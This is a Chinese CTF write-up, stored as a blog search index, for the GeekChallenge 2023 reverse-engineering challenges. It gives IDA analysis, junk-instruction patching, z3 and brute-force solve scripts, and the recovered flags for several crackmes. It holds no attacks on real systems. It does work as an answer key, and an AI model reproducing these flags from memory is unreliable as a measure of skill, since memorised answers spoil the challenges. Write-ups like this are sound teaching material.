<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>GeekChallenge2023逆向方向wp</title>
    <url>/2024/02/22/GeekChallenge2023%E9%80%86%E5%90%91%E6%96%B9%E5%90%91wp/</url>
    <content><![CDATA[<p>参赛ID:1K0CT</p>
<p>邮箱：<a href="mailto:&#111;&#107;&#x75;&#117;&#115;&#117;&#107;&#x75;&#64;&#x67;&#109;&#97;&#x69;&#108;&#46;&#x63;&#111;&#x6d;">&#111;&#107;&#x75;&#117;&#115;&#117;&#107;&#x75;&#64;&#x67;&#109;&#97;&#x69;&#108;&#46;&#x63;&#111;&#x6d;</a></p>
<span id="more"></span>

<h3 id="Shift-jmp-简单花指令"><a href="#Shift-jmp-简单花指令" class="headerlink" title="Shift_jmp | 简单花指令"></a>Shift_jmp | 简单花指令</h3><p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/23/20240223-011221.png" alt="image-20240223003954050"></p>
<p>将无条件跳转和<code>loc_117A</code>patch为<code>nop</code>重构主函数</p>
<img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/23/20240223-011426.png" alt="image-20231107160634631" style="zoom: 50%;" />

<p>简单的异或加密 解题Python脚本如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key = [<span class="number">83</span>,  <span class="number">88</span>,  <span class="number">65</span>, <span class="number">120</span>,  <span class="number">83</span>,  <span class="number">54</span>, <span class="number">106</span>, <span class="number">100</span>,  <span class="number">56</span>, <span class="number">100</span>, </span><br><span class="line">  <span class="number">111</span>,  <span class="number">84</span>, <span class="number">120</span>,  <span class="number">66</span>,  <span class="number">81</span>, <span class="number">123</span>, <span class="number">120</span>,  <span class="number">34</span>,  <span class="number">77</span>,  <span class="number">97</span>, </span><br><span class="line">   <span class="number">39</span>,  <span class="number">99</span>, <span class="number">115</span>,  <span class="number">69</span>,  <span class="number">45</span>, <span class="number">124</span>,  <span class="number">69</span>, <span class="number">108</span>,  <span class="number">44</span>, <span class="number">111</span>, </span><br><span class="line">   <span class="number">47</span>, <span class="number">123</span>,  <span class="number">94</span>,  <span class="number">92</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">34</span>):</span><br><span class="line">  <span class="built_in">print</span>(<span class="built_in">chr</span>(key[i] ^ i ^ <span class="number">0</span>), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#SYC&#123;W3lc0me_tO_th3_r3veR5e_w0r1d~&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="点击就送的逆向题-C源码的编译"><a href="#点击就送的逆向题-C源码的编译" class="headerlink" title="点击就送的逆向题 | C源码的编译"></a>点击就送的逆向题 | C源码的编译</h3><p><code>.s</code>文件是由C源码编译而来的汇编指令 它与<code>.S</code>文件的区别是它不支持预处理(#define…) gcc编译器可以将其经过链接等再编译为可执行文件 故可以先将<code>.s</code>文件编译为可执行文件再用IDA分析</p>
<p><code>clang click.s -o click</code></p>
<p>Kali虚拟机预装的gcc编译器用以上指令可以直接将<code>.s</code>文件编译为Linux可执行文件</p>
<img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/23/20240223-011426-1.png" alt="image-20231107162004359" style="zoom:50%;" />

<p>简单的位移加密 解题Python脚本如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key = <span class="string">&#x27;Z`J[X^LMNO`PPJPVQRSIUTJ]IMNOZKMM&#x27;</span></span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> key:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(each) - <span class="number">7</span>), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#SYCTQWEFGHYIICIOJKLBNMCVBFGHSDFF</span></span><br></pre></td></tr></table></figure>

<h3 id="Easymath-z3-solver简单使用"><a href="#Easymath-z3-solver简单使用" class="headerlink" title="Easymath | z3-solver简单使用"></a>Easymath | z3-solver简单使用</h3><p>Exinfo查到无壳 64位win程序 IDA64打开</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/23/20240223-011426-2.png" alt="image-20231107162748924"></p>
<ol>
<li>check函数逻辑简单 不分析(</li>
<li>checkposition函数逻辑也简单 不分析(</li>
<li>exchange函数</li>
</ol>
<img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/23/20240223-011426-3.png" alt="image-20231107163319234" style="zoom:50%;" />

<p>​	不理解 26行之前的代码作用 但是并不影响分析(</p>
<p>​	number在内存空间中每个有效元素之间插入三个0</p>
<img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/23/20240223-011426-4.png" alt="image-20231107163601963" style="zoom:45%;" />

<p>​	与代码中的<code>p_number[i] = number_[4 * v10]</code>对应 最后一个循环的作用就是将字符在table中的位置映射到这些有效元素上</p>
<p>回到主函数 主要的比较逻辑就是经过映射后的<code>position</code>作为一个5阶方阵与另一个5阶方阵<code>matrix</code>用特殊的矩阵乘法法则相乘得到的矩阵与单位矩阵相比 以下是Python代码实现 其中<code>n</code>为矩阵的阶数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        result[i][j] = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            result[i][j] = (M1[i][k] * M2[k][j] + result[i][j]) % <span class="number">0x20</span></span><br></pre></td></tr></table></figure>

<p>除此之外主函数中还能看到为了防止出现多解给出的flag提示(动态调试时发现其为flag中的元素 重构为数组可以将变量名从内存地址变为数组) 可以使用爆破的方式解出flag 也可以使用z3-solver库解出 </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">table = <span class="string">&#x27;01234_asdzxcpoityumnbAOZWXGMY&#x27;</span></span><br><span class="line">matrix  = [<span class="number">18</span>, <span class="number">29</span>, <span class="number">16</span>, <span class="number">19</span>, <span class="number">27</span>, </span><br><span class="line">            <span class="number">8</span>, <span class="number">31</span>,  <span class="number">8</span>, <span class="number">23</span>, <span class="number">30</span>, </span><br><span class="line">           <span class="number">29</span>,  <span class="number">3</span>, <span class="number">28</span>, <span class="number">10</span>, <span class="number">21</span>, </span><br><span class="line">           <span class="number">18</span>, <span class="number">29</span>,  <span class="number">8</span>, <span class="number">16</span>, <span class="number">28</span>, </span><br><span class="line">           <span class="number">11</span>, <span class="number">30</span>,  <span class="number">7</span>, <span class="number">20</span>,  <span class="number">7</span>]</span><br><span class="line">v7      = [<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line">           <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line">           <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line">           <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, </span><br><span class="line">           <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>]</span><br><span class="line">num     = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">19</span>, <span class="number">22</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">31</span>, <span class="number">32</span>, <span class="number">50</span>, <span class="number">51</span>, <span class="number">52</span>, <span class="number">53</span>, <span class="number">54</span>, <span class="number">55</span>, <span class="number">56</span>]</span><br><span class="line"><span class="keyword">for</span> w <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    mysolver = Solver()</span><br><span class="line">    position = IntVector(<span class="string">&#x27;position&#x27;</span>, <span class="number">5</span>)</span><br><span class="line">    <span class="keyword">if</span> w == <span class="number">0</span>:</span><br><span class="line">        mysolver.add(position[<span class="number">1</span>] == <span class="number">19</span>)</span><br><span class="line">    <span class="keyword">elif</span> w == <span class="number">1</span>:</span><br><span class="line">        mysolver.add(position[<span class="number">2</span>] == <span class="number">22</span>)</span><br><span class="line">    <span class="keyword">elif</span> w == <span class="number">3</span>:</span><br><span class="line">        mysolver.add(position[<span class="number">2</span>] == <span class="number">22</span>)</span><br><span class="line">    mysolver.add(And([Or([position[i] == val <span class="keyword">for</span> val <span class="keyword">in</span> num]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]))</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        expr = IntVal(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">            expr = (expr + position[k] * matrix[<span class="number">5</span> * k + j]) % <span class="number">0x20</span></span><br><span class="line">        mysolver.add(expr == v7[<span class="number">5</span> * w + j])</span><br><span class="line">    result = mysolver.check()</span><br><span class="line">    <span class="keyword">if</span> result == sat:</span><br><span class="line">        m = mysolver.model()</span><br><span class="line">        position_values = [m[position[i]].as_long() <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]</span><br><span class="line">        <span class="keyword">for</span> each <span class="keyword">in</span> position_values:</span><br><span class="line">            <span class="built_in">print</span>(table[num.index(each)], end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="comment">#xtd4co_ymiunbbx3Aypsmbzii</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;No solution&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>需要注意的是 可以一次性爆破全部不确定的22个元素 但这样会使复杂度提升到29^22(我猜的) 而每一次运算只用到<code>position</code>中的一行元素 故可以一行一行地爆破 可以将复杂度降低到5*29^5(我猜的)所以选择一行一行爆破(z3学习笔记另写)</p>
<h3 id="luck-简单爆破"><a href="#luck-简单爆破" class="headerlink" title="luck | 简单爆破"></a>luck | 简单爆破</h3><p>Exinfo查到无壳 64位win程序 IDA64打开</p>
<img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/23/20240223-011426-5.png" alt="image-20231107181356855" style="zoom: 67%;" />

<p>主函数定义了一个<code>unsigned __int8</code>类型地数组 这个数据类型的大小和<code>char</code>一样 <code>qmemcpy(cmp_data, &quot;\r\a&quot;, 2);</code>这句实际上只将<code>&quot;\r\a&quot;</code>中地前两个字符复制到了<code>cmp_data</code>的末尾 数组名代表首元素地址 所以</p>
<p>cmp_data[0] &#x3D; ‘\‘</p>
<p>cmp_data[1] &#x3D; ‘r’</p>
<p>同理<img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/23/20240223-011426-6.png" alt="image-20231107181921189" style="zoom: 50%;" /></p>
<p>将<code>&quot;o96*#&quot;</code>添加到了<code>cmp_data</code>的第37个元素及之后</p>
<p>(其实最简单的方式是动态调试直接查看cmp_data中的数据)</p>
<p>主函数中的加密函数为用递归实现的等差数列求和<img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/23/20240223-145103.png" alt="image-20240223145103900"></p>
<p>不管输入的数字是什么都会输出加密后的密文 根据flag前3个固定的字符爆破flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key = [<span class="number">13</span>,   <span class="number">7</span>,  <span class="number">29</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    result = <span class="built_in">int</span>(i * (i + <span class="number">1</span>) / <span class="number">2</span>) % <span class="number">0xD3</span></span><br><span class="line">    <span class="keyword">if</span> key[<span class="number">0</span>] ^ (result) == <span class="built_in">ord</span>(<span class="string">&#x27;S&#x27;</span>) <span class="keyword">and</span> key[<span class="number">1</span>] ^ (result) == <span class="built_in">ord</span>(<span class="string">&#x27;Y&#x27;</span>) <span class="keyword">and</span> key[<span class="number">2</span>] ^ (result) == <span class="built_in">ord</span>(<span class="string">&#x27;C&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="comment"># 69</span></span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>在程序中输入数字得到flag</p>
<h3 id="砍树-安卓逆向"><a href="#砍树-安卓逆向" class="headerlink" title="砍树 | 安卓逆向"></a>砍树 | 安卓逆向</h3><p>主函数的逻辑很简单<img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/23/20240223-011426-7.png" alt="image-20231107183128020"></p>
<p>就是调用一个函数传入输入的字符串和key 判断返回值 这个函数在<code>ezreeee</code>库中 导出这个库用IDA分析</p>
<img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/23/20240223-011426-8.png" alt="image-20231107183407674" style="zoom:67%;" />

<p>在函数列表中检索<code>I0o0I</code>函数 传入的参数有4个 其中有2个是<code>JNIEnv</code>和<code>jobject</code> JNI是为了让JAVA和C&#x2F;C++互通构建的环境 jxxxxx是为了不与C原有的类型冲突 所以从下面的2个<code>jstring_2unsigchar</code>函数也可以看出<code>a3</code>和<code>a4</code>分别为jeb伪代码中看到的两个参数与加密后的输入对比的是从内存0x14900中复制的35个字节型数据 以下是解密脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key = [<span class="number">0</span>,  <span class="number">32</span>,  <span class="number">32</span>,  <span class="number">23</span>,  <span class="number">27</span>,  <span class="number">54</span>,  <span class="number">14</span>,  <span class="number">54</span>,  <span class="number">38</span>,  <span class="number">23</span>, </span><br><span class="line">    <span class="number">4</span>,  <span class="number">42</span>,  <span class="number">41</span>,   <span class="number">7</span>,  <span class="number">38</span>,  <span class="number">21</span>,  <span class="number">82</span>,  <span class="number">51</span>,  <span class="number">45</span>,  <span class="number">15</span>, </span><br><span class="line">   <span class="number">58</span>,  <span class="number">39</span>,  <span class="number">17</span>,   <span class="number">6</span>,  <span class="number">51</span>,   <span class="number">7</span>,  <span class="number">70</span>,  <span class="number">23</span>,  <span class="number">61</span>,  <span class="number">10</span>, </span><br><span class="line">   <span class="number">60</span>,  <span class="number">56</span>,  <span class="number">46</span>,  <span class="number">34</span>,  <span class="number">24</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>]</span><br><span class="line">to_mod = <span class="string">&quot;Sycloverforerver&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> key:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(each ^ <span class="built_in">ord</span>(to_mod[i % <span class="number">7</span>])), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line"><span class="comment">#SYC&#123;t@ke_thE_bul1_By_the_h0rns_TAT&#125;SycloveSyclov</span></span><br></pre></td></tr></table></figure>

<h3 id="听说cpp很难？-C-逆向"><a href="#听说cpp很难？-C-逆向" class="headerlink" title="听说cpp很难？ | C++逆向"></a>听说cpp很难？ | C++逆向</h3><p>Exinfo查到无壳 64位win程序 IDA64打开 伪代码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  _BYTE *addr_nowChar; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> now_char; <span class="comment">// ebx</span></span><br><span class="line">  _BYTE *v8; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// ebx</span></span><br><span class="line">  __int64 v11; <span class="comment">// rax</span></span><br><span class="line">  __int64 v12; <span class="comment">// rax</span></span><br><span class="line">  __int64 m; <span class="comment">// [rsp+20h] [rbp-60h] BYREF</span></span><br><span class="line">  __int64 k; <span class="comment">// [rsp+28h] [rbp-58h] BYREF</span></span><br><span class="line">  <span class="type">char</span> copy_flag[<span class="number">32</span>]; <span class="comment">// [rsp+30h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">char</span> be_encoded[<span class="number">48</span>]; <span class="comment">// [rsp+50h] [rbp-30h] BYREF</span></span><br><span class="line">  _BYTE enc[<span class="number">32</span>]; <span class="comment">// [rsp+80h] [rbp+0h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v19[<span class="number">40</span>]; <span class="comment">// [rsp+A0h] [rbp+20h] BYREF</span></span><br><span class="line">  <span class="type">char</span> input_flag[<span class="number">40</span>]; <span class="comment">// [rsp+140h] [rbp+C0h] BYREF</span></span><br><span class="line">  __int64 v21; <span class="comment">// [rsp+168h] [rbp+E8h] BYREF</span></span><br><span class="line">  __int64 v22; <span class="comment">// [rsp+170h] [rbp+F0h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> len; <span class="comment">// [rsp+17Ch] [rbp+FCh]</span></span><br><span class="line">  <span class="type">int</span> v24; <span class="comment">// [rsp+180h] [rbp+100h]</span></span><br><span class="line">  <span class="type">int</span> v25; <span class="comment">// [rsp+184h] [rbp+104h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+188h] [rbp+108h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+18Ch] [rbp+10Ch]</span></span><br><span class="line"></span><br><span class="line">  _main(argc, argv, envp);</span><br><span class="line">  v3 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(refptr__ZSt4cout, <span class="string">&quot;place input your flag:&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::operator&lt;&lt;(v3, refptr__ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::basic_string(input_flag);</span><br><span class="line">  <span class="built_in">memset</span>(v19, <span class="number">0</span>, <span class="keyword">sizeof</span>(v19));</span><br><span class="line">  v19[<span class="number">0</span>] = <span class="number">0x4D</span>;</span><br><span class="line">  v19[<span class="number">1</span>] = <span class="number">0x5F</span>;</span><br><span class="line">  v19[<span class="number">2</span>] = <span class="number">0x3D</span>;</span><br><span class="line">  v19[<span class="number">3</span>] = <span class="number">0xFFFFFF85</span>;</span><br><span class="line">  v19[<span class="number">4</span>] = <span class="number">0x37</span>;</span><br><span class="line">  v19[<span class="number">5</span>] = <span class="number">0x68</span>;</span><br><span class="line">  v19[<span class="number">6</span>] = <span class="number">0x73</span>;</span><br><span class="line">  v19[<span class="number">7</span>] = <span class="number">0x57</span>;</span><br><span class="line">  v19[<span class="number">8</span>] = <span class="number">0x27</span>;</span><br><span class="line">  v19[<span class="number">9</span>] = <span class="number">0x68</span>;</span><br><span class="line">  v19[<span class="number">10</span>] = <span class="number">0x51</span>;</span><br><span class="line">  v19[<span class="number">11</span>] = <span class="number">0x59</span>;</span><br><span class="line">  v19[<span class="number">12</span>] = <span class="number">0x7F</span>;</span><br><span class="line">  v19[<span class="number">13</span>] = <span class="number">0x26</span>;</span><br><span class="line">  v19[<span class="number">14</span>] = <span class="number">0x6B</span>;</span><br><span class="line">  v19[<span class="number">15</span>] = <span class="number">0x59</span>;</span><br><span class="line">  v19[<span class="number">16</span>] = <span class="number">0x73</span>;</span><br><span class="line">  v19[<span class="number">17</span>] = <span class="number">0x57</span>;</span><br><span class="line">  v19[<span class="number">18</span>] = <span class="number">0x55</span>;</span><br><span class="line">  v19[<span class="number">19</span>] = <span class="number">0x5B</span>;</span><br><span class="line">  v19[<span class="number">20</span>] = <span class="number">0x59</span>;</span><br><span class="line">  v19[<span class="number">21</span>] = <span class="number">0x6F</span>;</span><br><span class="line">  v19[<span class="number">22</span>] = <span class="number">0x6A</span>;</span><br><span class="line">  v19[<span class="number">23</span>] = <span class="number">0x59</span>;</span><br><span class="line">  v19[<span class="number">24</span>] = <span class="number">0x27</span>;</span><br><span class="line">  v19[<span class="number">25</span>] = <span class="number">0x57</span>;</span><br><span class="line">  v19[<span class="number">26</span>] = <span class="number">0x72</span>;</span><br><span class="line">  v19[<span class="number">27</span>] = <span class="number">0x57</span>;</span><br><span class="line">  v19[<span class="number">28</span>] = <span class="number">0x4F</span>;</span><br><span class="line">  v19[<span class="number">29</span>] = <span class="number">0x57</span>;</span><br><span class="line">  v19[<span class="number">30</span>] = <span class="number">0x78</span>;</span><br><span class="line">  v19[<span class="number">31</span>] = <span class="number">0x78</span>;</span><br><span class="line">  v19[<span class="number">32</span>] = <span class="number">0xFFFFFF83</span>;</span><br><span class="line">  <span class="built_in">std</span>::operator&gt;&gt;&lt;<span class="type">char</span>&gt;(refptr__ZSt3cin, input_flag);</span><br><span class="line">  len = <span class="built_in">std</span>::<span class="built_in">string</span>::size(input_flag);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;::<span class="built_in">vector</span>(enc);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;::push_back(enc, &amp;v19[i]);</span><br><span class="line">    <span class="keyword">if</span> ( i &gt; <span class="number">34</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;                                             <span class="comment">// 复制v19到enc中</span></span><br><span class="line">  encode::encode(be_encoded, len, input_flag, <span class="number">10</span>);<span class="comment">// </span></span><br><span class="line">                                                <span class="comment">// be_encoded[0]    = len(flag)</span></span><br><span class="line">                                                <span class="comment">// be_encoded[8...] = input_flag</span></span><br><span class="line">                                                <span class="comment">// be_encoded[40]   = 10</span></span><br><span class="line">                                                <span class="comment">// be_encoded[44]   = 10</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">char</span>&gt;::<span class="built_in">vector</span>(copy_flag);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; ; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = j;</span><br><span class="line">    <span class="keyword">if</span> ( v4 &gt;= <span class="built_in">std</span>::<span class="built_in">string</span>::size(input_flag) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v5 = <span class="built_in">std</span>::<span class="built_in">string</span>::operator[](input_flag, j);<span class="comment">// v5 = input_flag[j]</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">char</span>&gt;::push_back(copy_flag, v5);</span><br><span class="line">  &#125;</span><br><span class="line">  v25 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( k = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">char</span>&gt;::begin(copy_flag);<span class="comment">// for k in copy_flag</span></span><br><span class="line">        ;</span><br><span class="line">        __gnu_cxx::__normal_iterator&lt;<span class="type">char</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">char</span>&gt;&gt;::operator++(&amp;k, <span class="number">0</span>i64) )</span><br><span class="line">  &#123;</span><br><span class="line">    v21 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">char</span>&gt;::end(copy_flag);</span><br><span class="line">    <span class="keyword">if</span> ( !__gnu_cxx::operator!=&lt;<span class="type">char</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">char</span>&gt;&gt;(&amp;k, &amp;v21) )<span class="comment">// 读到最后一个字符时退出</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    addr_nowChar = __gnu_cxx::__normal_iterator&lt;<span class="type">char</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">char</span>&gt;&gt;::operator*(&amp;k);</span><br><span class="line">    *addr_nowChar += be_encoded[<span class="number">44</span>];</span><br><span class="line">    now_char = *__gnu_cxx::__normal_iterator&lt;<span class="type">char</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">char</span>&gt;&gt;::operator*(&amp;k);</span><br><span class="line">    v8 = __gnu_cxx::__normal_iterator&lt;<span class="type">char</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">char</span>&gt;&gt;::operator*(&amp;k);</span><br><span class="line">    *v8 = text_67(be_encoded, now_char);        <span class="comment">// now_char += 10</span></span><br><span class="line">                                                <span class="comment">// now_char = (10 ^ now_char) - 10</span></span><br><span class="line">                                                <span class="comment">// now_char = v19[i]</span></span><br><span class="line">  &#125;</span><br><span class="line">  v24 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( m = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">char</span>&gt;::begin(copy_flag);</span><br><span class="line">        ;</span><br><span class="line">        __gnu_cxx::__normal_iterator&lt;<span class="type">char</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">char</span>&gt;&gt;::operator++(&amp;m, <span class="number">0</span>i64) )</span><br><span class="line">  &#123;</span><br><span class="line">    v22 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">char</span>&gt;::end(copy_flag);</span><br><span class="line">    <span class="keyword">if</span> ( !__gnu_cxx::operator!=&lt;<span class="type">char</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">char</span>&gt;&gt;(&amp;m, &amp;v22) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v9 = *__gnu_cxx::__normal_iterator&lt;<span class="type">char</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">char</span>&gt;&gt;::operator*(&amp;m);</span><br><span class="line">    <span class="keyword">if</span> ( v9 == *<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;::operator[](enc, v24) )</span><br><span class="line">      ++v25;</span><br><span class="line">    v10 = *__gnu_cxx::__normal_iterator&lt;<span class="type">char</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">char</span>&gt;&gt;::operator*(&amp;m);</span><br><span class="line">    <span class="keyword">if</span> ( v10 != *<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;::operator[](enc, v24) )</span><br><span class="line">      --v25;</span><br><span class="line">    ++v24;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v25 &gt; <span class="number">32</span> )                               <span class="comment">// v25统计正确的字符</span></span><br><span class="line">  &#123;</span><br><span class="line">    v11 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(refptr__ZSt4cout, <span class="string">&quot;yes yes you are right!&quot;</span>);</span><br><span class="line">    <span class="built_in">std</span>::ostream::operator&lt;&lt;(v11, refptr__ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v25 &lt;= <span class="number">32</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v12 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(refptr__ZSt4cout, <span class="string">&quot;no try again~&quot;</span>);</span><br><span class="line">    <span class="built_in">std</span>::ostream::operator&lt;&lt;(v12, refptr__ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">char</span>&gt;::~<span class="built_in">vector</span>(copy_flag);</span><br><span class="line">  encode::~encode(be_encoded);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;::~<span class="built_in">vector</span>(enc);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(input_flag);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分析C++逆向时<code>XXXXXXXoperatorxxx(a, b)</code> 可以看作<code>a</code>对<code>b</code>做<code>xxx</code>操作</p>
